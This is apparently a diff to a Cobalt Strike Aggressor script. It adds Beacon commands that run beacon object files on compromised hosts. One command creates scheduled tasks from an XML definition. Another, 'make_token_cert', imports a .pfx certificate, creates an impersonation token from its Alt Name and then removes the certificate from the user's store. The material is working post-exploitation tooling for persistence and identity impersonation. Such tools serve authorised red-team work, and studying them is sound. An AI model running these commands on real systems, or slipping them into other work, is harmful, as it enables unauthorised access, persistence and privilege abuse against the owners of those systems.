@@ -2077,3 +2077,59 @@ beacon_command_register(
     
     There are no arguments to this command"
 )
+sub bschtaskscreate
+{
+    local('$server $taskpath $taskxml $dialog $fpath $fp $bid $fdata $mode $index $force $args');
+    $bid = $1;
+    $server = "";
+    $fp = $null;
+    $taskpath = $2;
+    $mode = 1;
+    $force = 1;
+    $fpath = $3;
+    if(!-canread $fpath)
+    {
+        berror($bid, "Unable to read the xml task definition file: $fpath");
+        return;
+    }
+    $fp = openf($fpath);
+    $fdata = readb($fp, -1);
+    closef($fp);
+
+    $args = bof_pack($bid, "ZZZii", $server, $taskpath, $fdata, $mode, $force);
+    beacon_inline_execute($bid, readbof($bid, "schtaskscreate"), "go", $args);
+}
+
+alias make_token_cert
+{
+    local('$handle $certpath $cert $password $args');
+    if(size(@_) < 2)
+    {
+        berror($1, "usage: make_token_cert <.pfx local path> [opt: .pfx password]");
+        return;
+    }
+    $certpath = $2;
+    $password = iff($3, $3, "");
+    if(!-canread $certpath)
+    {
+        berror($1, "Unable to read $certpath on local system");
+        return;
+    }
+    $handle = openf($certpath);
+    $cert = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($1, "bZ", $cert, $password);
+    beacon_inline_execute($1, readbof($1, "make_token_cert"), "go", $args);
+}
+
+beacon_command_register(
+    "make_token_cert",
+    "Applies an impersonation token based on the Alt Name in a supplied .pfx file",
+    "Command: make_token_cert
+
+Usage make_token_cert <path to .pfx> [opt: password]
+
+Takes the path to a .pfx and optionally the password to decrypt the .pfx.
+Reads it into the certificate store for the current user and creates an impersonation token with it.
+Then deletes it from the users certificate store.");
